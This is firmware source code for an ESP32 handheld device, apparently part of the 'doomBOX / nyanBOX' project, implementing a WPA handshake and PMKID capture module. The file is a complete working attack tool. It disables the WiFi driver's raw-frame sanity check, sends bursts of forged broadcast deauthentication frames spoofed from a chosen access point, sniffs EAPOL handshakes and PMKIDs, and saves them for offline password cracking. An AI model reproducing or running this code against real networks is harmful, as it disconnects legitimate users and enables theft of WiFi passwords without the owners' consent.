/*
    doomBOX / nyanBOX
    EAPOL / PMKID handshake capture
    Improved for reliability, correct PMKID detection, and stable operation
    Copyright (c) 2026 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/handshake_capture.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include <EEPROM.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

#define BTN_UP    BUTTON_PIN_UP
#define BTN_DOWN  BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK  BUTTON_PIN_LEFT

// Bypass frame validation for raw 802.11 TX (same pattern as deauth module)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

// ---------------------------------------------------------------------------
// EEPROM layout (base 200, avoids settings/level region)
// ---------------------------------------------------------------------------
#define HS_EEPROM_BASE     200
#define HS_MAGIC0          0x48  // 'H'
#define HS_MAGIC1          0x53  // 'S'
#define HS_MAX_ENTRIES     4
#define HS_SSID_LEN        33
#define HS_PMKID_LEN       16

struct __attribute__((packed)) HandshakeEntry {
    uint8_t valid;
    uint8_t channel;
    uint8_t bssid[6];
    char    ssid[HS_SSID_LEN];
    uint8_t eapol_count;
    uint8_t has_pmkid;
    uint8_t pmkid[HS_PMKID_LEN];
    uint8_t reserved[5];
};

static_assert(sizeof(HandshakeEntry) == 64, "HandshakeEntry must be 64 bytes");

#define HS_ENTRY_SIZE      (sizeof(HandshakeEntry))
#define HS_COUNT_ADDR      (HS_EEPROM_BASE + 2)
#define HS_ENTRIES_ADDR    (HS_EEPROM_BASE + 3)

// ---------------------------------------------------------------------------
// Runtime state
// ---------------------------------------------------------------------------
enum HsMode {
    HS_MODE_MENU,
    HS_MODE_SCANNING,
    HS_MODE_LIST,
    HS_MODE_CAPTURE,
    HS_MODE_VIEW_LIST,
    HS_MODE_VIEW_DETAIL,
    HS_MODE_SAVED_MSG
};

static HsMode currentMode = HS_MODE_MENU;
static int menuSelection = 0;
static int apIndex = 0;
static int viewIndex = 0;

#define MAX_APS 20

struct AP_Info {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
};

static AP_Info apList[MAX_APS];
static int apCount = 0;

static bool scanInProgress = false;
static uint16_t currentScanCount = 0;
static unsigned long scanStartTime = 0;
static const unsigned long SCAN_DURATION = 8000;

static unsigned long lastDeauthTime = 0;
static unsigned long captureStartTime = 0;
static const unsigned long DEAUTH_BURST_INTERVAL_ACTIVE = 250;
static const unsigned long DEAUTH_BURST_INTERVAL_SLOW   = 1200;
static const unsigned long AUTO_STOP_MS = 45000;

static volatile uint16_t eapolCount = 0;
static volatile uint8_t  capturedPmkid[HS_PMKID_LEN];
static volatile bool     hasPmkid = false;
static volatile bool     captureActive = false;
static volatile bool     gotMessage1 = false;
static volatile bool     gotMessage2 = false;

#define CANDIDATE_MAX 160
static volatile bool     candidateReady = false;
static volatile uint16_t candidateLen = 0;
static uint8_t           candidateBuf[CANDIDATE_MAX];

static uint8_t targetBssid[6];
static uint8_t targetChannel = 1;
static char    targetSsid[33];

static bool needsRedraw = true;
static HsMode lastMode = HS_MODE_MENU;
static int lastMenuSelection = -1;
static int lastApIndex = -1;
static int lastViewIndex = -1;
static uint16_t lastEapolCount = 0;
static bool lastHasPmkid = false;
static uint16_t lastScanCount = 0;
static unsigned long lastScanUpdate = 0;
static const unsigned long scanUpdateInterval = 100;

static unsigned long savedMsgUntil = 0;
static bool deauthStopped = false;

static uint8_t deauthFrame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

// ---------------------------------------------------------------------------
// EEPROM helpers
// ---------------------------------------------------------------------------
static void hsEepromInit() {
    uint8_t m0 = EEPROM.read(HS_EEPROM_BASE);
    uint8_t m1 = EEPROM.read(HS_EEPROM_BASE + 1);
    if (m0 != HS_MAGIC0 || m1 != HS_MAGIC1) {
        EEPROM.write(HS_EEPROM_BASE, HS_MAGIC0);
        EEPROM.write(HS_EEPROM_BASE + 1, HS_MAGIC1);
        EEPROM.write(HS_COUNT_ADDR, 0);
        for (int i = 0; i < HS_MAX_ENTRIES; i++) {
            int base = HS_ENTRIES_ADDR + i * HS_ENTRY_SIZE;
            for (size_t b = 0; b < HS_ENTRY_SIZE; b++) {
                EEPROM.write(base + b, 0);
            }
        }
        EEPROM.commit();
    }
}

static uint8_t hsLoadCount() {
    uint8_t c = EEPROM.read(HS_COUNT_ADDR);
    if (c > HS_MAX_ENTRIES) c = 0;
    return c;
}

static void hsReadEntry(int idx, HandshakeEntry &out) {
    if (idx < 0 || idx >= HS_MAX_ENTRIES) {
        memset(&out, 0, sizeof(out));
        return;
    }
    int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
    uint8_t *p = (uint8_t *)&out;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
        p[i] = EEPROM.read(base + i);
    }
}

static void hsWriteEntry(int idx, const HandshakeEntry &in) {
    if (idx < 0 || idx >= HS_MAX_ENTRIES) return;
    int base = HS_ENTRIES_ADDR + idx * HS_ENTRY_SIZE;
    const uint8_t *p = (const uint8_t *)&in;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
        EEPROM.write(base + i, p[i]);
    }
}

static void hsClearAll() {
    EEPROM.write(HS_COUNT_ADDR, 0);
    for (int i = 0; i < HS_MAX_ENTRIES; i++) {
        HandshakeEntry blank;
        memset(&blank, 0, sizeof(blank));
        hsWriteEntry(i, blank);
    }
    EEPROM.commit();
}

static void hsSaveCurrentCapture() {
    if (eapolCount == 0) return;

    HandshakeEntry entry;
    memset(&entry, 0, sizeof(entry));
    entry.valid = 1;
    entry.channel = targetChannel;
    memcpy(entry.bssid, targetBssid, 6);
    strncpy(entry.ssid, targetSsid, HS_SSID_LEN - 1);
    entry.ssid[HS_SSID_LEN - 1] = '\0';
    entry.eapol_count = (eapolCount > 255) ? 255 : (uint8_t)eapolCount;

    if (hasPmkid) {
        entry.has_pmkid = 1;
        memcpy(entry.pmkid, (const void *)capturedPmkid, HS_PMKID_LEN);
    } else {
        entry.has_pmkid = 0;
    }

    uint8_t count = hsLoadCount();
    int slot;
    if (count < HS_MAX_ENTRIES) {
        slot = count;
        count++;
        EEPROM.write(HS_COUNT_ADDR, count);
    } else {
        for (int i = 0; i < HS_MAX_ENTRIES - 1; i++) {
            HandshakeEntry tmp;
            hsReadEntry(i + 1, tmp);
            hsWriteEntry(i, tmp);
        }
        slot = HS_MAX_ENTRIES - 1;
    }
    hsWriteEntry(slot, entry);
    EEPROM.commit();
}

// ---------------------------------------------------------------------------
// Light promiscuous callback
// ---------------------------------------------------------------------------
static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!captureActive) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (len < 36 || len > 512) return;

    bool bssidMatch = false;
    if (len >= 24) {
        if (memcmp(payload + 4,  targetBssid, 6) == 0 ||
            memcmp(payload + 10, targetBssid, 6) == 0 ||
            memcmp(payload + 16, targetBssid, 6) == 0) {
            bssidMatch = true;
        }
    }
    if (!bssidMatch) return;

    int searchEnd = (len < 80) ? (int)len - 1 : 80;
    for (int i = 24; i < searchEnd; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            eapolCount++;
            if (!candidateReady) {
                uint16_t copyLen = len;
                if (copyLen > CANDIDATE_MAX) copyLen = CANDIDATE_MAX;
                for (uint16_t k = 0; k < copyLen; k++) {
                    candidateBuf[k] = payload[k];
                }
                candidateLen = copyLen;
                candidateReady = true;
            }
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Main-loop parser
// ---------------------------------------------------------------------------
static void processCandidate() {
    if (!candidateReady) return;

    uint16_t len = candidateLen;
    const uint8_t *payload = candidateBuf;
    candidateReady = false;

    int eapolOff = -1;
    for (int i = 24; i + 1 < (int)len; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            eapolOff = i;
            break;
        }
    }
    if (eapolOff < 0) return;

    if (eapolOff + 4 >= (int)len) return;
    uint8_t eapolType = payload[eapolOff + 3];
    if (eapolType != 0x03) return;

    if (eapolOff + 7 >= (int)len) return;
    uint16_t keyInfo = (uint16_t)payload[eapolOff + 6] | ((uint16_t)payload[eapolOff + 7] << 8);

    bool keyAck  = (keyInfo & 0x0080) != 0;
    bool keyMic  = (keyInfo & 0x0100) != 0;
    bool install = (keyInfo & 0x0040) != 0;

    if (keyAck && !keyMic && !install) gotMessage1 = true;
    if (!keyAck && keyMic)             gotMessage2 = true;

    if (hasPmkid) return;

    for (int j = eapolOff + 8; j + 22 < (int)len; j++) {
        if (payload[j] == 0xDD &&
            payload[j + 1] >= 0x14 &&
            payload[j + 2] == 0x00 &&
            payload[j + 3] == 0x0F &&
            payload[j + 4] == 0xAC &&
            payload[j + 5] == 0x04) {
            for (int z = 0; z < HS_PMKID_LEN; z++) {
                capturedPmkid[z] = payload[j + 6 + z];
            }
            bool allZero = true;
            for (int z = 0; z < HS_PMKID_LEN; z++) {
                if (capturedPmkid[z] != 0) { allZero = false; break; }
            }
            if (!allZero) {
                hasPmkid = true;
            }
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Radio helpers
// ---------------------------------------------------------------------------
static void sendDeauthBurst() {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    memcpy(deauthFrame + 10, targetBssid, 6);
    memcpy(deauthFrame + 16, targetBssid, 6);
    for (int i = 0; i < 4; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }
}

static void stopCaptureRadio() {
    captureActive = false;
    candidateReady = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    delay(20);
}

static void startScan() {
    if (scanInProgress) return;

    apCount = 0;
    currentScanCount = 0;
    scanInProgress = true;
    currentMode = HS_MODE_SCANNING;
    needsRedraw = true;

    stopCaptureRadio();
    initWiFi(WIFI_MODE_APSTA);
    delay(30);

    wifi_scan_config_t scan_config = {};
    scan_config.ssid = NULL;
    scan_config.bssid = NULL;
    scan_config.channel = 0;
    scan_config.show_hidden = false;
    scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scan_config.scan_time.active.min = 120;
    scan_config.scan_time.active.max = 200;

    esp_wifi_scan_start(&scan_config, false);
    scanStartTime = millis();
}

static void processScanResults() {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);

    if (number > 0) {
        wifi_ap_record_t *ap_info =
            (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
        if (ap_info) {
            memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
            uint16_t actual = number;
            if (esp_wifi_scan_get_ap_records(&actual, ap_info) == ESP_OK) {
                apCount = 0;
                for (int i = 0; i < (int)actual && apCount < MAX_APS; i++) {
                    if (ap_info[i].ssid[0] == 0) continue;
                    strncpy(apList[apCount].ssid, (const char *)ap_info[i].ssid, 32);
                    apList[apCount].ssid[32] = '\0';
                    memcpy(apList[apCount].bssid, ap_info[i].bssid, 6);
                    apList[apCount].channel = ap_info[i].primary;
                    apCount++;
                }
            }
            free(ap_info);
        }
    }

    scanInProgress = false;
    apIndex = 0;
    currentMode = HS_MODE_LIST;
    needsRedraw = true;
}

// ---------------------------------------------------------------------------
// Drawing
// ---------------------------------------------------------------------------
static void drawMenu() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Handshake Capture");
    u8g2.drawStr(0, 28, menuSelection == 0 ? "> Capture" : "  Capture");
    u8g2.drawStr(0, 42, menuSelection == 1 ? "> View Saved" : "  View Saved");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=Move R=Select L=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawScanning() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Scanning APs...");
    char buf[24];
    snprintf(buf, sizeof(buf), "Found: %u", (unsigned)currentScanCount);
    u8g2.drawStr(0, 28, buf);
    int barX = 0, barY = 40, barWidth = 128, barHeight = 10;
    u8g2.drawFrame(barX, barY, barWidth, barHeight);
    unsigned long elapsed = millis() - scanStartTime;
    int fill = (int)((elapsed * (barWidth - 4)) / SCAN_DURATION);
    if (fill > barWidth - 4) fill = barWidth - 4;
    if (fill > 0) u8g2.drawBox(barX + 2, barY + 2, fill, barHeight - 4);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "Please wait");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Select AP:");
    if (apCount == 0) {
        u8g2.drawStr(0, 28, "No networks found");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back");
    } else {
        int start = 0;
        if (apIndex > 0) start = apIndex - 1;
        if (apIndex == apCount - 1 && apCount > 2) start = apCount - 3;
        if (start < 0) start = 0;
        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= apCount) break;
            char line[22];
            char ssidShort[16];
            strncpy(ssidShort, apList[idx].ssid, 15);
            ssidShort[15] = '\0';
            snprintf(line, sizeof(line), "%s%s", (idx == apIndex) ? ">" : " ", ssidShort);
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Move R=Start L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawCapture() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    char ssidShort[18];
    strncpy(ssidShort, targetSsid, 17);
    ssidShort[17] = '\0';
    u8g2.drawStr(0, 10, ssidShort);
    char buf[32];
    snprintf(buf, sizeof(buf), "Ch:%d  EAPOL:%u", targetChannel, (unsigned)eapolCount);
    u8g2.drawStr(0, 22, buf);
    char hs[20];
    snprintf(hs, sizeof(hs), "M1:%s M2:%s",
             gotMessage1 ? "Y" : "-",
             gotMessage2 ? "Y" : "-");
    u8g2.drawStr(0, 34, hs);
    if (hasPmkid) {
        u8g2.drawStr(0, 46, "PMKID: CAPTURED");
    } else {
        u8g2.drawStr(0, 46, deauthStopped ? "Deauth: slowed" : "Deauth: active");
    }
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Save&Stop");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawSavedMsg() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(20, 28, "Saved!");
    if (hasPmkid) {
        u8g2.drawStr(10, 44, "PMKID included");
    } else {
        u8g2.drawStr(4, 44, "EAPOL only (no PMKID)");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Saved Handshakes");
    uint8_t count = hsLoadCount();
    if (count == 0) {
        u8g2.drawStr(0, 28, "No captures yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back");
    } else {
        if (viewIndex >= count) viewIndex = count - 1;
        int start = 0;
        if (viewIndex > 0) start = viewIndex - 1;
        if (viewIndex == count - 1 && count > 2) start = count - 3;
        if (start < 0) start = 0;
        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= count) break;
            HandshakeEntry e;
            hsReadEntry(idx, e);
            char line[22];
            char ssidShort[14];
            strncpy(ssidShort, e.ssid, 13);
            ssidShort[13] = '\0';
            snprintf(line, sizeof(line), "%s%s%s",
                     (idx == viewIndex) ? ">" : " ",
                     ssidShort,
                     e.has_pmkid ? "*" : "");
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D R=Detail L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewDetail() {
    HandshakeEntry e;
    hsReadEntry(viewIndex, e);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    char ssidShort[22];
    strncpy(ssidShort, e.ssid, 21);
    ssidShort[21] = '\0';
    u8g2.drawStr(0, 8, ssidShort);
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             e.bssid[0], e.bssid[1], e.bssid[2],
             e.bssid[3], e.bssid[4], e.bssid[5]);
    char masked[18];
    maskMAC(mac, masked);
    u8g2.drawStr(0, 18, masked);
    char info[32];
    snprintf(info, sizeof(info), "Ch:%d  EAPOL:%u", e.channel, e.eapol_count);
    u8g2.drawStr(0, 28, info);
    if (e.has_pmkid) {
        u8g2.drawStr(0, 38, "PMKID:");
        char hex1[20], hex2[20];
        snprintf(hex1, sizeof(hex1), "%02X%02X%02X%02X%02X%02X%02X%02X",
                 e.pmkid[0], e.pmkid[1], e.pmkid[2], e.pmkid[3],
                 e.pmkid[4], e.pmkid[5], e.pmkid[6], e.pmkid[7]);
        snprintf(hex2, sizeof(hex2), "%02X%02X%02X%02X%02X%02X%02X%02X",
                 e.pmkid[8], e.pmkid[9], e.pmkid[10], e.pmkid[11],
                 e.pmkid[12], e.pmkid[13], e.pmkid[14], e.pmkid[15]);
        u8g2.drawStr(0, 48, hex1);
        u8g2.drawStr(0, 58, hex2);
    } else {
        u8g2.drawStr(0, 42, "PMKID: none");
        u8g2.drawStr(0, 58, "L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void handshakeCaptureSetup() {
    initWiFi(WIFI_MODE_APSTA);
    stopCaptureRadio();

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);

    hsEepromInit();

    currentMode = HS_MODE_MENU;
    menuSelection = 0;
    apIndex = 0;
    viewIndex = 0;
    apCount = 0;
    eapolCount = 0;
    hasPmkid = false;
    gotMessage1 = false;
    gotMessage2 = false;
    captureActive = false;
    scanInProgress = false;
    deauthStopped = false;
    candidateReady = false;

    needsRedraw = true;
    lastMode = HS_MODE_MENU;
    lastMenuSelection = -1;
    lastApIndex = -1;
    lastViewIndex = -1;
    lastEapolCount = 0;
    lastHasPmkid = false;
    lastScanCount = 0;
}

void handshakeCaptureLoop() {
    updateLastActivity();
    unsigned long now = millis();

    if (currentMode == HS_MODE_SCANNING) {
        esp_wifi_scan_get_ap_num(&currentScanCount);
        if (currentScanCount != lastScanCount) {
            lastScanCount = currentScanCount;
            needsRedraw = true;
        }
        if (now - lastScanUpdate >= scanUpdateInterval) {
            lastScanUpdate = now;
            needsRedraw = true;
        }
        if (needsRedraw) {
            drawScanning();
            needsRedraw = false;
        }
        if (now - scanStartTime > SCAN_DURATION) {
            processScanResults();
        }
        return;
    }

    if (currentMode == HS_MODE_SAVED_MSG) {
        if (now >= savedMsgUntil) {
            currentMode = HS_MODE_LIST;
            needsRedraw = true;
        } else if (needsRedraw) {
            drawSavedMsg();
            needsRedraw = false;
        }
        return;
    }

    if (captureActive) {
        processCandidate();
    }

    bool up    = digitalRead(BTN_UP) == LOW;
    bool down  = digitalRead(BTN_DOWN) == LOW;
    bool left  = digitalRead(BTN_BACK) == LOW;
    bool right = digitalRead(BTN_RIGHT) == LOW;

    switch (currentMode) {
    case HS_MODE_MENU:
        if (up || down) {
            menuSelection ^= 1;
            needsRedraw = true;
            delay(180);
        }
        if (right) {
            if (menuSelection == 0) {
                startScan();
            } else {
                currentMode = HS_MODE_VIEW_LIST;
                viewIndex = 0;
                needsRedraw = true;
            }
            delay(180);
        }
        break;

    case HS_MODE_LIST:
        if (up && apCount) {
            apIndex = (apIndex - 1 + apCount) % apCount;
            needsRedraw = true;
            delay(180);
        }
        if (down && apCount) {
            apIndex = (apIndex + 1) % apCount;
            needsRedraw = true;
            delay(180);
        }
        if (right && apCount) {
            strncpy(targetSsid, apList[apIndex].ssid, sizeof(targetSsid) - 1);
            targetSsid[sizeof(targetSsid) - 1] = '\0';
            memcpy(targetBssid, apList[apIndex].bssid, 6);
            targetChannel = apList[apIndex].channel;

            eapolCount = 0;
            hasPmkid = false;
            gotMessage1 = false;
            gotMessage2 = false;
            deauthStopped = false;
            candidateReady = false;
            memset((void *)capturedPmkid, 0, HS_PMKID_LEN);

            initWiFi(WIFI_MODE_APSTA);
            delay(20);
            esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

            esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
            wifi_promiscuous_filter_t filt = {};
            filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
            esp_wifi_set_promiscuous_filter(&filt);
            esp_wifi_set_promiscuous(true);
            captureActive = true;

            currentMode = HS_MODE_CAPTURE;
            captureStartTime = now;
            lastDeauthTime = 0;
            needsRedraw = true;
            delay(180);
        }
        if (left) {
            currentMode = HS_MODE_MENU;
            needsRedraw = true;
            delay(180);
        }
        break;

    case HS_MODE_CAPTURE: {
        if (left) {
            stopCaptureRadio();
            bool hadData = (eapolCount > 0);
            if (hadData) {
                hsSaveCurrentCapture();
                savedMsgUntil = now + 1200;
                currentMode = HS_MODE_SAVED_MSG;
            } else {
                currentMode = HS_MODE_LIST;
            }
            needsRedraw = true;
            delay(180);
            break;
        }

        if (now - captureStartTime > AUTO_STOP_MS) {
            stopCaptureRadio();
            if (eapolCount > 0) {
                hsSaveCurrentCapture();
                savedMsgUntil = now + 1200;
                currentMode = HS_MODE_SAVED_MSG;
            } else {
                currentMode = HS_MODE_LIST;
            }
            needsRedraw = true;
            break;
        }

        bool success = hasPmkid || (gotMessage1 && gotMessage2);
        if (success && !deauthStopped) {
            deauthStopped = true;
            needsRedraw = true;
        }

        unsigned long interval = deauthStopped ? DEAUTH_BURST_INTERVAL_SLOW
                                               : DEAUTH_BURST_INTERVAL_ACTIVE;
        if (now - lastDeauthTime >= interval) {
            lastDeauthTime = now;
            if (!deauthStopped) {
                sendDeauthBurst();
            } else if ((now / 3000) % 2 == 0) {
                sendDeauthBurst();
            }
        }

        if (eapolCount != lastEapolCount || hasPmkid != lastHasPmkid) {
            lastEapolCount = eapolCount;
            lastHasPmkid = hasPmkid;
            needsRedraw = true;
        }
        break;
    }

    case HS_MODE_VIEW_LIST: {
        uint8_t count = hsLoadCount();
        if (up && count) {
            viewIndex = (viewIndex - 1 + count) % count;
            needsRedraw = true;
            delay(180);
        }
        if (down && count) {
            viewIndex = (viewIndex + 1) % count;
            needsRedraw = true;
            delay(180);
        }
        if (right && count) {
            currentMode = HS_MODE_VIEW_DETAIL;
            needsRedraw = true;
            delay(180);
        }
        if (up && down && count) {
            hsClearAll();
            viewIndex = 0;
            needsRedraw = true;
            delay(400);
        }
        if (left) {
            currentMode = HS_MODE_MENU;
            needsRedraw = true;
            delay(180);
        }
        break;
    }

    case HS_MODE_VIEW_DETAIL:
        if (left) {
            currentMode = HS_MODE_VIEW_LIST;
            needsRedraw = true;
            delay(180);
        }
        break;

    default:
        break;
    }

    if (currentMode != lastMode) {
        lastMode = currentMode;
        needsRedraw = true;
    }
    if (menuSelection != lastMenuSelection) {
        lastMenuSelection = menuSelection;
        needsRedraw = true;
    }
    if (apIndex != lastApIndex) {
        lastApIndex = apIndex;
        needsRedraw = true;
    }
    if (viewIndex != lastViewIndex) {
        lastViewIndex = viewIndex;
        needsRedraw = true;
    }

    if (needsRedraw) {
        switch (currentMode) {
        case HS_MODE_MENU:        drawMenu(); break;
        case HS_MODE_SCANNING:    break;
        case HS_MODE_LIST:        drawList(); break;
        case HS_MODE_CAPTURE:     drawCapture(); break;
        case HS_MODE_VIEW_LIST:   drawViewList(); break;
        case HS_MODE_VIEW_DETAIL: drawViewDetail(); break;
        case HS_MODE_SAVED_MSG:   drawSavedMsg(); break;
        default: break;
        }
        needsRedraw = false;
    }
}

void handshakeViewSetup() {
    handshakeCaptureSetup();
    currentMode = HS_MODE_VIEW_LIST;
    viewIndex = 0;
    needsRedraw = true;
}

void handshakeViewLoop() {
    handshakeCaptureLoop();
}
